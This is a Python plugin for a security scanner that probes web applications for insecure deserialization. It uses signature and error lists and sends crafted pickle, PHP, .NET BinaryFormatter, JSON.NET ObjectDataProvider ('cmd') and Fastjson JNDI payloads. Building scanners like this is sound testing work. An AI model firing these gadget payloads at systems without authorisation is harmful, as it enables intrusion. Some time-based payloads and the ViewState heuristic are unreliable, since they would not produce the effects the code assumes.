"""Insecure deserialization detection â€” Java, PHP, Python, .NET, Ruby.

Detects deserialization vulnerabilities by:
1. Scanning for serialized object indicators in responses/cookies
2. Testing endpoints with crafted serialized payloads
3. Time-based detection for blind deserialization
4. Framework-specific gadget chain indicators
"""

from __future__ import annotations

import base64
import logging
import re
import time
from typing import ClassVar
from urllib.parse import quote

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)

# Serialized object signatures by platform
SERIAL_SIGNATURES: dict[str, list[tuple[str, str]]] = {
    "Java": [
        ("rO0AB", "Base64 Java serialized object"),
        ("aced0005", "Java serialized object (hex)"),
        ("H4sIAAAA", "Base64 GZIPped Java object"),
        (".class", "Java class reference"),
        ("javax.faces.ViewState", "JSF ViewState"),
        ("__VIEWSTATE", "ASP.NET ViewState (may contain Java)"),
    ],
    "PHP": [
        ("O:", "PHP serialized object"),
        ("a:", "PHP serialized array"),
        ("s:", "PHP serialized string"),
        ("C:", "PHP serialized custom object"),
        ("phpserialize", "PHP serialize marker"),
    ],
    "Python": [
        ("\\x80\\x04\\x95", "Python pickle v4"),
        ("\\x80\\x05\\x95", "Python pickle v5"),
        ("gASV", "Base64 Python pickle"),
        ("cos\\nsystem", "Python pickle command exec"),
        ("cposix\\nsystem", "Python pickle POSIX exec"),
        ("ccopy_reg\\n", "Python pickle copy_reg"),
    ],
    ".NET": [
        ("AAEAAAD/////", "Base64 .NET BinaryFormatter"),
        ("ObjectStateFormatter", ".NET ObjectStateFormatter"),
        ("LosFormatter", ".NET LosFormatter"),
        ("TypeNameHandling", "JSON.NET TypeNameHandling"),
        ("__type", "JSON.NET type discriminator"),
        ("$type", "JSON.NET polymorphic type"),
    ],
    "Ruby": [
        ("BAhJIh", "Base64 Ruby Marshal"),
        ("\\x04\\x08", "Ruby Marshal data"),
        ("_ruby_marshal", "Ruby Marshal marker"),
    ],
}

# Parameters/cookies likely to contain serialized data
SERIAL_PARAMS = [
    "viewstate", "__VIEWSTATE", "__VIEWSTATEGENERATOR",
    "javax.faces.ViewState", "token", "session", "data",
    "object", "payload", "state", "config", "settings",
    "serialized", "encoded", "base64",
]

SERIAL_COOKIES = [
    "JSESSIONID", "PHPSESSID", "session", "token",
    "remember_me", "user", "data", "state",
    "rack.session", "_session",
]

# Time-based deserialization payloads (cause delay if deserialized)
TIME_PAYLOADS: dict[str, list[tuple[str, int, str]]] = {
    "Java": [
        # Base64 of a sleep gadget chain indicator
        # These are detection markers, not actual exploits
        (
            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
            5,
            "Java HashMap gadget marker",
        ),
    ],
    "PHP": [
        (
            'O:21:"JDatabaseDriverMysql":0:{}',
            5,
            "PHP Joomla deserialization",
        ),
        (
            'a:1:{i:0;O:9:"Exception":0:{}}',
            5,
            "PHP Exception object",
        ),
    ],
    "Python": [
        (
            base64.b64encode(b'\x80\x04\x95\x17\x00\x00\x00\x00\x00\x00\x00'
                             b'\x8c\x04time\x8c\x05sleep\x93C\x01\x05\x85R.').decode(),
            5,
            "Python pickle sleep",
        ),
    ],
}

# Deserialization error patterns
DESER_ERROR_PATTERNS: dict[str, list[str]] = {
    "Java": [
        "java.io.invalidclassexception",
        "java.io.streamcorruptedexception",
        "java.lang.classnotfoundexception",
        "objectinputstream",
        "deserialize",
        "readobject",
        "commons-collections",
        "ysoserial",
        "gadgetchain",
    ],
    "PHP": [
        "unserialize()",
        "allowed_classes",
        "object injection",
        "__wakeup",
        "__destruct",
        "php object injection",
    ],
    "Python": [
        "unpickling",
        "pickle.loads",
        "pickle.load",
        "_reconstructor",
        "found no int at",
    ],
    ".NET": [
        "binaryformatter",
        "objectstateformatter",
        "typenameassertion",
        "serializationexception",
        "typeconverter",
    ],
    "Ruby": [
        "marshal.load",
        "marshal data too short",
        "incompatible marshal file",
        "undefined class",
    ],
}


class DeserializationCheckPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="deserialization_check",
        display_name="Deserialization Check",
        category=PluginCategory.PENTESTING,
        description=(
            "Detects insecure deserialization in Java, PHP, "
            "Python, .NET, and Ruby applications"
        ),
        produces=["deserialization_findings"],
        timeout=40.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available"
            )

        from basilisk.utils.http_check import resolve_base_url

        findings: list[Finding] = []
        tested: list[dict] = []

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"deserialization": []},
            )

        # Detect tech stack from pipeline
        tech_stack = self._get_tech_stack(target.host, ctx)

        # Phase 1: Scan responses and cookies for serialization markers
        serial_found = await self._scan_for_serialized_data(
            ctx, base_url,
        )
        for sf in serial_found:
            tested.append(sf)
            findings.append(Finding.medium(
                f"Serialized data detected: {sf['platform']} ({sf['description']})",
                description=(
                    f"Found {sf['platform']} serialized data in "
                    f"{sf['location']}: {sf['description']}"
                ),
                evidence=sf.get("evidence", "")[:200],
                remediation=(
                    f"Avoid deserializing untrusted {sf['platform']} data. "
                    "Use safe alternatives (JSON, protobuf). "
                    "Implement integrity checks (HMAC) on serialized data."
                ),
                tags=["pentesting", "deserialization", sf["platform"].lower()],
            ))

        # Phase 2: Test with malformed serialized payloads (error-based)
        if not ctx.should_stop:
            error_findings = await self._test_error_based(
                ctx, base_url, tech_stack,
            )
            for ef in error_findings:
                tested.append(ef)
                findings.append(Finding.high(
                    f"Deserialization error: {ef['platform']}",
                    description=(
                        f"Server reveals {ef['platform']} deserialization error "
                        f"when given malformed serialized data via {ef['param']}"
                    ),
                    evidence=ef.get("evidence", "")[:200],
                    remediation=(
                        "Do not deserialize untrusted data. "
                        "Suppress detailed error messages. "
                        "Use type-safe serialization formats."
                    ),
                    tags=["pentesting", "deserialization", ef["platform"].lower()],
                ))

        # Phase 3: Time-based detection
        if not ctx.should_stop:
            time_findings = await self._test_time_based(
                ctx, base_url, tech_stack,
            )
            for tf in time_findings:
                tested.append(tf)
                findings.append(Finding.critical(
                    f"Deserialization RCE indicator: {tf['platform']}",
                    description=(
                        f"Time-based deserialization detected for "
                        f"{tf['platform']}. Server processed serialized "
                        f"payload with measurable delay."
                    ),
                    evidence=tf.get("evidence", "")[:200],
                    remediation=(
                        "CRITICAL: Remove all deserialization of untrusted data. "
                        "This may allow Remote Code Execution."
                    ),
                    tags=["pentesting", "deserialization", "rce", tf["platform"].lower()],
                ))

        # Phase 4: Check for JSON deserialization issues
        if not ctx.should_stop:
            json_findings = await self._test_json_deser(ctx, base_url)
            for jf in json_findings:
                tested.append(jf)
                findings.append(Finding.high(
                    f"JSON deserialization issue: {jf['description']}",
                    description=jf.get("detail", ""),
                    evidence=jf.get("evidence", "")[:200],
                    remediation=(
                        "Disable TypeNameHandling in JSON.NET. "
                        "Do not use polymorphic type resolution on untrusted JSON."
                    ),
                    tags=["pentesting", "deserialization", "json"],
                ))

        if not findings:
            findings.append(Finding.info(
                "No deserialization vulnerabilities detected",
                tags=["pentesting", "deserialization"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"deserialization": tested},
        )

    async def _scan_for_serialized_data(
        self, ctx, base_url: str,
    ) -> list[dict]:
        """Scan responses and cookies for serialized data markers."""
        results: list[dict] = []
        scan_paths = ["/", "/login", "/api/user", "/dashboard"]

        for path in scan_paths:
            if ctx.should_stop:
                break

            try:
                async with ctx.rate:
                    resp = await ctx.http.get(
                        f"{base_url}{path}", timeout=8.0,
                    )
                    body = await resp.text(encoding="utf-8", errors="replace")
                    headers = dict(resp.headers)
            except Exception as e:
                logger.debug("deserialization_check: %s", e)
                continue

            # Check response body
            for platform, sigs in SERIAL_SIGNATURES.items():
                for sig, desc in sigs:
                    if sig in body:
                        results.append({
                            "platform": platform,
                            "description": desc,
                            "location": f"response body ({path})",
                            "evidence": f"Found '{sig}' in response",
                        })

            # Check cookies
            set_cookie = headers.get("Set-Cookie", "")
            for platform, sigs in SERIAL_SIGNATURES.items():
                for sig, desc in sigs:
                    if sig in set_cookie:
                        results.append({
                            "platform": platform,
                            "description": desc,
                            "location": f"Set-Cookie header ({path})",
                            "evidence": f"Found '{sig}' in cookie",
                        })

            # Check for ViewState (JSF/ASP.NET)
            viewstate_match = re.search(
                r'name=["\'](?:javax\.faces\.ViewState|__VIEWSTATE)["\']'
                r'\s+value=["\']([^"\']+)',
                body,
            )
            if viewstate_match:
                vs_value = viewstate_match.group(1)
                platform = "Java" if "javax" in viewstate_match.group(0) else ".NET"
                # Check if ViewState is encrypted/signed
                if not self._viewstate_is_protected(vs_value, platform):
                    results.append({
                        "platform": platform,
                        "description": f"Unprotected {platform} ViewState",
                        "location": f"form field ({path})",
                        "evidence": f"ViewState: {vs_value[:60]}...",
                    })

        return results[:10]

    async def _test_error_based(
        self,
        ctx,
        base_url: str,
        tech_stack: list[str],
    ) -> list[dict]:
        """Test with malformed serialized data to trigger errors."""
        results: list[dict] = []
        test_paths = ["/", "/api", "/login"]

        # Malformed payloads by platform
        malformed: dict[str, list[tuple[str, str]]] = {
            "Java": [
                ("rO0ABXNyAA==", "Truncated Java serialized object"),
                ("aced00057372", "Malformed Java object (hex)"),
            ],
            "PHP": [
                ("O:99999:\"A\":0:{}", "PHP object with invalid class length"),
                ('a:1:{s:4:"test";O:8:"stdClass":0:{}}', "PHP nested object"),
            ],
            "Python": [
                ("gASVBQAAAAAAAACMBHRlc3SU", "Truncated Python pickle"),
            ],
            ".NET": [
                ("AAEAAAD/////AQAAAA==", "Truncated .NET BinaryFormatter"),
            ],
        }

        for path in test_paths:
            if ctx.should_stop:
                break

            for param in SERIAL_PARAMS[:5]:
                if ctx.should_stop:
                    break

                for platform, payloads in malformed.items():
                    # Skip platforms not in detected tech stack
                    if tech_stack and not self._platform_matches(platform, tech_stack):
                        continue

                    for payload, desc in payloads:
                        url = f"{base_url}{path}?{param}={quote(payload)}"
                        try:
                            async with ctx.rate:
                                resp = await ctx.http.get(url, timeout=5.0)
                                body = (
                                    await resp.text(encoding="utf-8", errors="replace")
                                ).lower()

                                # Check for deserialization error patterns
                                error_patterns = DESER_ERROR_PATTERNS.get(platform, [])
                                for pattern in error_patterns:
                                    if pattern in body:
                                        results.append({
                                            "platform": platform,
                                            "param": param,
                                            "payload": payload,
                                            "description": desc,
                                            "evidence": (
                                                f"Error pattern '{pattern}' in "
                                                f"response to {desc}"
                                            ),
                                        })
                                        break
                        except Exception as e:
                            logger.debug("deserialization_check: %s", e)
                            continue

        return results[:5]

    async def _test_time_based(
        self,
        ctx,
        base_url: str,
        tech_stack: list[str],
    ) -> list[dict]:
        """Test with time-delay payloads for blind deserialization."""
        results: list[dict] = []

        for param in SERIAL_PARAMS[:3]:
            if ctx.should_stop:
                break

            # Measure baseline
            baseline = await self._measure(
                ctx, f"{base_url}/?{param}=test",
            )
            if baseline is None:
                continue

            for platform, payloads in TIME_PAYLOADS.items():
                if tech_stack and not self._platform_matches(platform, tech_stack):
                    continue

                for payload, expected_delay, desc in payloads:
                    if ctx.should_stop:
                        break

                    elapsed = await self._measure(
                        ctx,
                        f"{base_url}/?{param}={quote(payload)}",
                    )
                    if elapsed is None:
                        continue

                    delta = elapsed - baseline
                    if delta >= expected_delay * 0.8:
                        # Confirm
                        retry = await self._measure(
                            ctx,
                            f"{base_url}/?{param}={quote(payload)}",
                        )
                        if retry and retry - baseline >= expected_delay * 0.8:
                            results.append({
                                "platform": platform,
                                "param": param,
                                "description": desc,
                                "evidence": (
                                    f"Baseline: {baseline:.2f}s, "
                                    f"Payload: {elapsed:.2f}s, "
                                    f"Delta: {delta:.2f}s"
                                ),
                            })

        return results[:3]

    async def _test_json_deser(
        self, ctx, base_url: str,
    ) -> list[dict]:
        """Test for JSON deserialization issues (JSON.NET, Jackson)."""
        results: list[dict] = []
        api_paths = ["/api/user", "/api/data", "/api/config", "/login"]

        # JSON.NET TypeNameHandling test
        json_payloads = [
            (
                '{"$type":"System.Windows.Data.ObjectDataProvider,'
                'PresentationFramework","ObjectInstance":{"$type":"System.Diagnostics.Process,'
                'System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo,'
                'System","FileName":"cmd"}}}',
                ".NET",
                "JSON.NET ObjectDataProvider",
            ),
            (
                '{"@type":"com.sun.rowset.JdbcRowSetImpl",'
                '"dataSourceName":"ldap://127.0.0.1/test","autoCommit":true}',
                "Java",
                "Fastjson/Jackson JNDI injection",
            ),
        ]

        for path in api_paths:
            if ctx.should_stop:
                break

            # Baseline: send benign JSON to measure normal status code
            baseline_status = 0
            try:
                async with ctx.rate:
                    baseline_resp = await ctx.http.post(
                        f"{base_url}{path}",
                        data='{"test":"baseline"}',
                        headers={"Content-Type": "application/json"},
                        timeout=8.0,
                    )
                    baseline_status = baseline_resp.status
            except Exception:
                pass

            for payload, platform, desc in json_payloads:
                try:
                    async with ctx.rate:
                        resp = await ctx.http.post(
                            f"{base_url}{path}",
                            data=payload,
                            headers={"Content-Type": "application/json"},
                            timeout=8.0,
                        )
                        body = (
                            await resp.text(encoding="utf-8", errors="replace")
                        ).lower()

                        # Check for error that reveals deserialization attempt
                        error_patterns = DESER_ERROR_PATTERNS.get(platform, [])
                        for pattern in error_patterns:
                            if pattern in body:
                                results.append({
                                    "platform": platform,
                                    "description": desc,
                                    "detail": (
                                        f"Server attempted to deserialize "
                                        f"malicious {platform} JSON payload. "
                                        f"Error pattern: {pattern}"
                                    ),
                                    "evidence": (
                                        f"Path: {path}, "
                                        f"Error: {pattern}"
                                    ),
                                })
                                break

                        # 500 only meaningful if baseline was NOT 500
                        # (otherwise endpoint just rejects any payload)
                        if resp.status == 500 and baseline_status != 500:
                            results.append({
                                "platform": platform,
                                "description": f"{desc} (500 error)",
                                "detail": (
                                    f"Server returned 500 when processing "
                                    f"{desc} payload (baseline: "
                                    f"{baseline_status}), suggesting the "
                                    f"serialized type was processed."
                                ),
                                "evidence": (
                                    f"Path: {path}, "
                                    f"Status: 500 (baseline: {baseline_status})"
                                ),
                            })
                except Exception as e:
                    logger.debug("deserialization_check: %s", e)
                    continue

        return results[:5]

    @staticmethod
    def _get_tech_stack(host: str, ctx) -> list[str]:
        """Get detected technologies from pipeline."""
        tech_key = f"tech_detect:{host}"
        tech_result = ctx.pipeline.get(tech_key)
        if tech_result and tech_result.ok:
            techs = tech_result.data.get("technologies", [])
            return [
                t.get("name", t) if isinstance(t, dict) else str(t)
                for t in techs
            ]
        return []

    @staticmethod
    def _platform_matches(platform: str, tech_stack: list[str]) -> bool:
        """Check if platform matches detected tech stack."""
        platform_lower = platform.lower()
        tech_lower = [t.lower() for t in tech_stack]

        mappings = {
            "java": ["java", "spring", "tomcat", "jboss", "wildfly", "jsf"],
            "php": ["php", "laravel", "wordpress", "drupal", "symfony"],
            "python": ["python", "django", "flask", "fastapi"],
            ".net": [".net", "asp", "iis", "microsoft"],
            "ruby": ["ruby", "rails", "sinatra"],
        }

        keywords = mappings.get(platform_lower, [platform_lower])
        return any(kw in t for t in tech_lower for kw in keywords)

    @staticmethod
    def _viewstate_is_protected(value: str, platform: str) -> bool:
        """Check if ViewState appears to be encrypted/signed."""
        if platform == ".NET":
            # .NET ViewState with MAC is typically longer
            try:
                decoded = base64.b64decode(value)
                # Signed ViewState has a 20-byte HMAC at the end
                return len(decoded) > 40
            except Exception as e:
                logger.debug("deserialization_check: %s", e)
                return True  # Can't decode = likely protected
        # JSF ViewState: check for encryption indicators
        return len(value) > 200

    @staticmethod
    async def _measure(ctx, url: str) -> float | None:
        """Measure response time."""
        try:
            async with ctx.rate:
                t0 = time.monotonic()
                await ctx.http.get(url, timeout=15.0)
                return time.monotonic() - t0
        except Exception as e:
            logger.debug("deserialization_check: %s", e)
            return None
